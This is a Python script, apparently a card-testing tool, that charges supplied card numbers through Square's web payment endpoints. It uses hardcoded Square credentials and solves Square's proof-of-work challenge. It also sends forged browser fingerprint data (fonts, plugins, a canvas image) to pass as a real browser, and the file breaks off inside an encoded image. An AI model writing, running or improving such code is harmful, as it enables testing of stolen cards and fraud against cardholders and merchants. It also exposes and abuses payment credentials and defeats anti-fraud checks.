import requests
import hashlib,uuid
# Square API credentials
SQUARE_APPLICATION_ID = "sq0idp-BsY1FGXhyrkvEkGcF-SOZA"
SQUARE_TOKEN = "EAAAEUqjWASv551LQVRseObKQ-v48jTikyyTxce6UAGMDhr0NlKaHJrwDNtfM4hh"
SQUARE_LOCATION = "LH92QZNZZ62A3"
SQUARE_SANDBOX = False  # Change to True for sandbox mode
def find_pow_counter(session_id, application_id, location_id, instance_id, pow_prefix="000"):
        counter = 0
        while True:
            counter += 1
            data = session_id + ":" + str(counter) + ":" + ",".join([application_id, location_id, instance_id])
            hash_result = hashlib.sha256(data.encode()).hexdigest()
            if hash_result.startswith(pow_prefix):
                return counter

async def square_key_charge(cc,mm, yy, cvv):
    mmm = int(mm)
    yyy = int(yy)
    
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/json; charset=utf-8',
        'origin': 'https://web.squarecdn.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://web.squarecdn.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    }

    params = {
        'applicationId': SQUARE_APPLICATION_ID,
        'locationId': SQUARE_LOCATION,
        'version': '1.69.0',
    }
    try:

        response = requests.get('https://pci-connect.squareup.com/payments/hydrate', params=params, headers=headers)
        session = response.json()['sessionId']
        instance = response.json()['instanceId']
        powPrefix = response.json()['powPrefix']
    except:
        return "Error: Could not get session and instance ID (Maybe keys revoked)"
    pow = find_pow_counter(session, SQUARE_APPLICATION_ID, SQUARE_LOCATION, instance, powPrefix)
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/json; charset=utf-8',
        'origin': 'https://web.squarecdn.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://web.squarecdn.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    }

    params = {
        '_': '1740907760462.7764',
        'version': '1.69.0',
    }

    json_data = {
        'analytics': {
            'fingerprints': [
                {
                    'components': '{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36","language":"en-US","resolution":[1536,864],"available_resolution":[1536,816],"timezone_offset":-330,"navigator_platform":"Win32","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Book Antiqua","Bookman Old Style","Calibri","Cambria","Cambria Math","Century","Century Gothic","Century Schoolbook","Comic Sans MS","Consolas","Courier","Courier New","Garamond","Georgia","Helvetica","Impact","Lucida Bright","Lucida Calligraphy","Lucida Console","Lucida Fax","Lucida Handwriting","Lucida Sans","Lucida Sans Typewriter","Lucida Sans Unicode","Microsoft Sans Serif","Monotype Corsiva","MS Gothic","MS Outlook","MS PGothic","MS Reference Sans Serif","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]}',
                    'fingerprint': 'a249d5a7e943dbb21fee0a42ace0ab1b',
                    'version': 'fingerprint-v1',
                },
                {
                    'components': '{"language":"en-US","resolution":[1536,864],"available_resolution":[1536,816],"timezone_offset":-330,"navigator_platform":"Win32","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Book Antiqua","Bookman Old Style","Calibri","Cambria","Cambria Math","Century","Century Gothic","Century Schoolbook","Comic Sans MS","Consolas","Courier","Courier New","Garamond","Georgia","Helvetica","Impact","Lucida Bright","Lucida Calligraphy","Lucida Console","Lucida Fax","Lucida Handwriting","Lucida Sans","Lucida Sans Typewriter","Lucida Sans Unicode","Microsoft Sans Serif","Monotype Corsiva","MS Gothic","MS Outlook","MS PGothic","MS Reference Sans Serif","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]}',
                    'fingerprint': 'e752f8b22471467f4c3273ef30ca0421',
                    'version': 'fingerprint-v1-sans-ua',
                },
                {
                    'components': '{"fonts":["Agency FB","Calibri","Century","Century Gothic","Franklin Gothic","Haettenschweiler","Leelawadee","Lucida Bright","Lucida Sans","MS Outlook","MS Reference Specialty","MS UI Gothic","MT Extra","Marlett","Microsoft Uighur","Monotype Corsiva","Pristina","Segoe UI Light"],"font_preferences":{"default":119.45000457763672,"apple":119.45000457763672,"serif":119.45000457763672,"sans":115.2125015258789,"mono":97.2125015258789,"min":7.474999904632568,"system":118.2874984741211},"audio":124.04347527516074,"screen_frame":[0,0,50,0],"languages":[["en-US"]],"device_memory":8,"screen_resolution":[864,1536],"hardware_concurrency":12,"timezone":"Asia/Calcutta","indexed_db":true,"open_database":false,"platform":"Win32","plugins":[{"name":"PDF Viewer","description":"Portable Document Format","mimeTypes":[{"type":"application/pdf","suffixes":"pdf"},{"type":"text/pdf","suffixes":"pdf"}]},{"name":"Chrome PDF Viewer","description":"Portable Document Format","mimeTypes":[{"type":"application/pdf","suffixes":"pdf"},{"type":"text/pdf","suffixes":"pdf"}]},{"name":"Chromium PDF Viewer","description":"Portable Document Format","mimeTypes":[{"type":"application/pdf","suffixes":"pdf"},{"type":"text/pdf","suffixes":"pdf"}]},{"name":"Microsoft Edge PDF Viewer","description":"Portable Document Format","mimeTypes":[{"type":"application/pdf","suffixes":"pdf"},{"type":"text/pdf","suffixes":"pdf"}]},{"name":"WebKit built-in PDF","description":"Portable Document Format","mimeTypes":[{"type":"application/pdf","suffixes":"pdf"},{"type":"text/pdf","suffixes":"pdf"}]}],"canvas":{"winding":true,"geometry":"data:image/png;base64,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","text":"data:image/png;base64,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